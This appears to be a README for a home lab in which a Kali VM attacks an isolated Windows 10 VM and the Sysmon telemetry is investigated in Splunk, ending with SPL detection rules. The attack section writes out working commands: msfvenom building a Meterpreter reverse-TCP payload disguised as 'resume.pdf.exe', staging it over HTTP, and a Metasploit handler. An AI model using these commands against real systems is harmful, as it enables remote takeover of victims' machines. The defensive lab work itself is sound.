# Detection Engineering & SOC Telemetry Home Lab

An end-to-end cybersecurity laboratory built to simulate adversary tactics, capture endpoint telemetry using Microsoft Sysmon, and analyze process lineage and network artifacts inside Splunk Enterprise.

---

## 🛠️ Lab Architecture & Network Topology

Both machines reside on an isolated internal network (`project`) with no external internet routing during payload execution to ensure safe sandbox conditions.

```text
+-----------------------------------------------------------------------------------------+
|                               Host Machine (Hypervisor)                                 |
|                                                                                         |
|   +----------------------------------+          +-----------------------------------+   |
|   |     Attacker VM: Kali Linux      |          |    Target VM: Windows 10 Pro      |   |
|   |         IP: 192.168.20.11        |          |  Hostname: DESKTOP-JCKQ6MH        |   |
|   |----------------------------------|          |  User: nik | IP: 192.168.20.10    |   |
|   | • Recon: Nmap                    |          |-----------------------------------|   |
|   | • Staging: Python HTTP Server    |  <====>  | • Host Endpoint                   |   |
|   | • Exploit: MSF Multi-Handler     | Internal | • Telemetry: Microsoft Sysmon     |   |
|   | • Payload: resume.pdf.exe        | Network  | • SIEM: Splunk Enterprise         |   |
|   +----------------------------------+          +-----------------------------------+   |
+-----------------------------------------------------------------------------------------+
```

---

## 🔧 Environment Configuration

### 1. Isolated VirtualBox Network Adapter Setup
To prevent malicious network traffic from escaping to the local LAN, both VMs are attached to an isolated **Internal Network** named `project`.

![VirtualBox Internal Network](screenshots/01_vbox_internal_network.png)

### 2. Attacker Node Setup (Kali Linux)
- **Interface:** `eth0`
- **Assigned IP:** `192.168.20.11/24`
- **Method:** Statically defined in Network Manager.

![Kali Static Network Configuration](screenshots/02_kali_network_config.png)

### 3. Target Node Setup (Windows 10 Pro)
- **Hostname:** `DESKTOP-JCKQ6MH`
- **User Account:** `nik`
- **Assigned IP:** `192.168.20.10/24`

![Windows IPv4 GUI Configuration](screenshots/03_win10_ipv4_gui.png)

### 4. Connectivity Verification
Verified static addressing via `ipconfig` and established round-trip ICMP connectivity by pinging the Kali Linux attacker host (`192.168.20.11`) with 0% packet loss.

![Windows IP and Ping Test](screenshots/04_win10_ip_and_ping.png)

---

## ⚔️ Attack Phase & Adversary Emulation

### 1. Network Reconnaissance (Nmap)
Executed an aggressive service scan skipping host discovery (`-Pn`):

```bash
nmap -A -Pn 192.168.20.10
```

![Nmap Reconnaissance Scan](screenshots/05_nmap_recon_scan.png)

**Open Services Identified:**
- `135/tcp` (Microsoft Windows RPC)
- `139/tcp` & `445/tcp` (SMB / NetBIOS)
- `3389/tcp` (Microsoft Terminal Services / RDP — Host: `DESKTOP-JCKQ6MH`)
- `5432/tcp` (PostgreSQL / Splunk DB Service)

---

### 2. Staging C2 & Listener Setup

Generated an x64 reverse TCP payload with a double extension disguise:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.20.11 LPORT=4444 \
  -f exe -o resume.pdf.exe
```

Staged the payload with `python3 -m http.server 9999` and started Metasploit's multi-handler:

```bash
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.20.11
set LPORT 4444
exploit
```

Upon victim execution, Meterpreter caught the incoming stage and spawned an interactive shell:

![Metasploit Handler & Shell](screenshots/06_metasploit_handler_session.png)

---

### 3. Post-Exploitation Discovery
From the interactive command shell, executed initial reconnaissance commands:

```cmd
net user
net localgroup administrators
ipconfig
```

![Post-Exploitation Host Discovery](screenshots/07_host_discovery_commands.png)

---

## 🔍 Telemetry Ingestion & Splunk Investigation

### 1. Sysmon Ingestion Pipeline
Sysmon operational logs are forwarded into Splunk Enterprise and routed to the dedicated `endpoint` index.

```ini
# inputs.conf
[WinEventLog://Microsoft-Windows-Sysmon/Operational]
disabled = false
renderXml = 1
index = endpoint
```

![Splunk Sysmon Ingestion](screenshots/08_splunk_sysmon_ingestion.png)

---

### 2. Process Lineage Reconstruction (Event ID 1)

To isolate the adversary process execution chain, the following SPL query was run:

```spl
index=endpoint EventCode=1 NOT ParentImage=*Splunk* ("resume.pdf*" OR "net*" OR "ipconfig*")
| table _time, ParentImage, Image, CommandLine
| sort _time
```

![Splunk Process Lineage Table](screenshots/09_splunk_process_tree.png)

#### Observed Process Tree Breakdown

| Timestamp (UTC) | Parent Image | Executed Image | CommandLine | MITRE ATT&CK Mapping |
| :--- | :--- | :--- | :--- | :--- |
| `05:02:17` | `C:\Windows\explorer.exe` | `...\resume.pdf (1).exe` | `"...\resume.pdf (1).exe"` | **T1204.002:** Malicious File |
| `05:02:48` | `...\resume.pdf (1).exe` | `C:\Windows\System32\cmd.exe` | `C:\Windows\system32\cmd.exe` | **T1059.003:** Windows Command Shell |
| `05:02:59` | `C:\Windows\System32\cmd.exe` | `C:\Windows\System32\net.exe` | `net user` | **T1087.001:** Local Account Discovery |
| `05:02:59` | `C:\Windows\System32\net.exe` | `C:\Windows\System32\net1.exe` | `C:\Windows\system32\net1 user` | Legacy execution wrapper |
| `05:03:00` | `C:\Windows\System32\cmd.exe` | `C:\Windows\System32\net.exe` | `net localgroup administrators` | **T1069.001:** Local Groups Discovery |
| `05:03:00` | `C:\Windows\System32\net.exe` | `C:\Windows\System32\net1.exe` | `C:\Windows\system32\net1 localgroup administrators` | Legacy execution wrapper |

---

## 🛡️ Detection Engineering Rules

### 1. Masqueraded Executable Execution
```spl
index=endpoint EventCode=1 
| regex Image="(?i)\.(pdf|docx|xlsx|txt)\.exe$"
| table _time Computer User ParentImage Image CommandLine
```

### 2. Shell Spawned by User-Space Executable
```spl
index=endpoint EventCode=1 Image="*\\cmd.exe" OR Image="*\\powershell.exe"
| where match(ParentImage, "(?i)Users\\\\.*\\\\(Downloads|Desktop|AppData)")
| table _time Computer ParentImage Image CommandLine
```

### 3. Rapid Account Discovery Execution
```spl
index=endpoint EventCode=1 Image IN ("*\\net.exe", "*\\net1.exe", "*\\whoami.exe") 
  CommandLine IN ("*user*", "*localgroup*", "*administrators*")
| stats count earliest(_time) as start latest(_time) as end values(CommandLine) by Computer, ParentProcessGuid
| where count >= 2
```
